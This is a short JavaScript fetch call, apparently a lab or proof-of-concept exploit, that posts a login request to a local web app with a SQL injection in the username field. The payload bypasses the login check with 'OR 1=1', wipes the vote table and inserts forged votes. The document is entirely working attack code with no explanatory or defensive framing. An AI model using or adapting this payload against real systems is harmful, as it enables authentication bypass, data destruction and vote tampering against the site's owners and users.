fetch("http://localhost:7170/login", {
    "body": JSON.stringify({
        username: `123' OR 1=1;
        TRUNCATE TABLE vote;
        INSERT INTO vote (cid,uid) VALUES 
        (3,1),
        (3,2),
        (3,3),
        (3,4),
        (3,5),
        (3,6),
        (3,7),
        (3,8),
        (3,9),
        (3,10);
        #'`,
        password: '',
    }), "headers": {
        "content-type": "application/json",
    },
    "method": "POST"
});